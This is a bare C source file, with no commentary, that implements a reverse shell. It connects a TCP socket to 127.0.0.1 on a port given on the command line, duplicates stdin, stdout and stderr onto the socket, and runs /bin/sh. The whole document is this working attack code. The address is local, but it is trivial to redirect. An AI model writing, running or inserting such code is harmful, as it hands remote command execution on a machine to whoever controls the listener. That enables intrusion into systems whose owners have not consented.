#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>


#define ERROR	-1


main(int argc, char **argv)
{
	struct sockaddr_in server;
	int sock;
	int sockaddr_len = sizeof(struct sockaddr_in);
	char *arguments[] = { "/bin/sh", 0 };
	
	
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR)
	{
		perror("server socket: ");
		exit(-1);
	}
		
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[1]));
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	bzero(&server.sin_zero, 8);
			
	if((connect(sock, (struct sockaddr *)&server, sockaddr_len)) == ERROR)
	{
		perror("bind : ");
		exit(-1);
	}

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	execve(arguments[0], &arguments[0], NULL);
		
}

	
